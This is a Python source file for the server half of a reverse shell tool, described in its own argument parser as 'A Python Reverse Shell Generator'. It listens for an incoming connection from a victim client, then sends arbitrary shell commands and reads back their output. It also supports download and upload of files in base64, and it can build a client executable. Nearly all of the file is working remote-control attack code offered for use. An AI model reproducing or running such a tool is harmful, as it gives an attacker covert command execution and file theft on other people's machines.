#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
This is the main file and starting point of the program.
'''

__author__ = 'lorem.cookie'
__version__ = '0.3/alpha'

__banner__ = '''\n
--------------------------------------------------------------------------------------------------------------------
|                                                                                                                  |
|    [~~ Program by lorem.cookie ~~]                                                                               |
|                                                                                                                  |
|    [~~ Lorem_Py3 ~~]                                                                                             |
|                                                                                                                  |
|    [Options:]                                                                                                    |
|        [[REQUIERD]['--PORT' : Specify the port to server on] For example : 8060]]                                |
|        [[OPTIONAL]['--HOST' : Specify the hosts ip] For example : 127.0.0.1]]                                    |
|        [[OPTIONAL]['--BUILD' : Build client .exe and .py from SampleClient.txt]]                                 |
|                                                                                                                  |
|    [~~ Thank you for using this program <3 ~~]                                                                   |
|                                                                                                                  |
--------------------------------------------------------------------------------------------------------------------\n
'''

#Native Libs
import socket
import argparse
import json

#Not native Libs
import subprocess
import colorama
import base64

#Custome Libs
from simple_logging import logging
from build import Build

#Config
color = False
debug = True

if color:

    colorama.init() #Init colorama

    #Set colors
    GREEN = colorama.Fore.GREEN
    RED   = colorama.Fore.RED
    YELLOW = colorama.Fore.YELLOW
    RESET = colorama.Fore.RESET

if debug:

    debug_log = logging(
        LogLevel='DEBUG',
        LogFile='debug.log'
    )

#Exceptions
class ErrorCreatingSocket(Exception):
    def __init__(self):
        Exception.__init__(self,'ERROR CREATING SOCKET')
        
class TCPShell:
    '''
    Class for TCP Shell
    '''
    
    def __init__(self, HOST, PORT):
        
        if color:
        
            print('{}[INFO]Initializing TCP server...{}'.format(GREEN, RESET))
        
        else:
            
            print('[INFO]Initializing TCP server...')
        
        self.HOST = HOST
        self.PORT = PORT
        self.logger = logging(
            LogLevel='DEBUG',
            LogFile='tcp_server.log',
            Debug=True
        ) #Initializing _logging_ class
        
        if debug:
        
            debug_log.DEBUG('Class input Values; HOST : {}, PORT : {}'.format(self.HOST, self.PORT))
        
    def json_send(self, data):
        
        json_dump = json.dumps(data.decode())
        
        if debug:
            
            debug_log.DEBUG('Send Json_dump : {}'.format(json_dump))
        
        json_dump = json_dump.encode()
        self.conn.send(json_dump)
    
    def json_recv(self):
    
        data = ''
        
        while True:
            
            try:
                
                data = data + self.conn.recv(1024).decode()
                data = json.loads(data)
                
                if debug:
                    
                    debug_log.DEBUG('Recv Json_dump : {}'.format(data))
                
                return data.encode()
            
            except ValueError:
                
                continue
    
    def bind_shell(self):
        '''
        Create and bind socket
        '''
        
        try:
            
            #Creating and binding socket
            self.s = socket.socket()
            self.s.bind((self.HOST, self.PORT)) #Bind HOST and PORT to socket
            self.s.listen(1) #Listening for one connection
            
            self.logger.INFO('TCP Server serving on Port {}'.format(self.PORT))
                        
            if color:
                
                print('\n{}[INFO]SERVING ON PORT {}{}'.format(GREEN, self.PORT, RESET))
                print('--------------------------------------')
            
            else:
                
                print('\n[INFO]SERVING ON PORT {}'.format(self.PORT))
                print('--------------------------------------')
            
            self.conn, self.addr = self.s.accept()
            
            self.logger.INFO('Connection from {}'.format(self.addr))
            
            if color:
                
                print('\n{}[INFO]CONNECTION FROM {}{}'.format(GREEN, self.addr, RESET))
                print('--------------------------------------')

            else:
                
                print('\n[INFO]CONNECTION FROM {}'.format(self.addr))
                print('--------------------------------------')

        except Exception as e:
            
            self.logger.ERROR('Error while creating socket {}'.format(e))
            raise ErrorCreatingSocket
        
    def shell_loop(self):
        '''
        Shell loop sending and recv commands
        '''
            
        while True:
                
            try:
                    
                command = input('{}/Shell>'.format(self.addr)) #Input for command
                    
            except KeyboardInterrupt:
                
                if color:
                
                    print('\n{}[WARNING]KEYBOARDINTERRUPT KILLING SHELL{}'.format(YELLOW, RESET))
                
                else:
                    
                    print('\n[WARNING]KEYBOARDINTERRUPT KILLING SHELL')
                
                self.logger.WARNING('KEYBOARDINTERRUPT KILLING CONNECTION')
                self.conn.send('KILL'.encode())
                self.conn.close()
                raise SystemExit
            
            if debug:
            
                debug_log.DEBUG('Input Command : {}'.format(command))
                    
            if(command == None):
                
                self.json_send('clearstr'.encode())
                
            elif(command == 'KILL'):
                
                if color:
                    
                    print('\n{}[WARNING]KILLING SHELL{}'.format(YELLOW, RESET))
                    
                else:
                    
                    print('\n[WARNING]KILLING SHELL')
                    
                self.logger.WARNING('KILL COMMAND SEND KILLING SHELL')
                self.json_send('KILL'.encode())
                self.conn.close()
                raise SystemExit
            
            elif(command[:8] == 'download'):
                
                self.json_send(command.encode())
                
                with open(command[9:], 'wb') as f:
                    
                    content = self.json_recv()
                    debug_log.DEBUG('Download base 64 data : {}'.format(content))
                    f.write(base64.b64decode(content))
            
            elif(command[:6] == 'upload'):
                
                self.json_send(command.encode())
                
                with open(command[7:], 'rb') as f:
                    
                    content = f.read()
                    debug_log.DEBUG('Upload base 64 data : {}'.format(content))
                    self.json_send(base64.b64encode(content))
            
            else:
                
                self.json_send(command.encode()) #Send command
                print(self.json_recv().decode()) #Recv client feedback
            
def main():
    
    #Parse commandline arguments
    parser = argparse.ArgumentParser(description='A Python Reverse Shell Generator') #Create parser object
    parser.add_argument('--HOST', action='store', dest='host', required=False) #Add Host argument
    parser.add_argument('--PORT', action='store', type=int, dest='port', required=True) #Add PORT argument
    parser.add_argument('--BUILD', action='store_true', dest='BUILD_IF', required=False) #Add BUILD argument
    args = parser.parse_args()
    HOST = args.host
    PORT = args.port
    BUILD_IF = args.BUILD_IF

    print(__banner__)
    
    if(HOST == None): #Check if HOST argument has been used
        
        HOST = str(socket.gethostbyname(socket.gethostname())) #Set HOST var to current local ip

    if color:

        print('{}[INFO] HOST IP : {}{}'.format(GREEN, HOST, RESET))

    else:
        
        print('[INFO] HOST IP : {}'.format(HOST))
    
    if BUILD_IF: #Check if BUILD argument has benn used
        
        Build(HOST, PORT, Debug=True) #Call Build function for building client
        
    shell = TCPShell(HOST, PORT) #Call TCPSERVER class for TCP handeling
    shell.bind_shell() #Binding shell
    shell.shell_loop() #Enter Shell loop
    
if __name__ == '__main__':
    
    main()
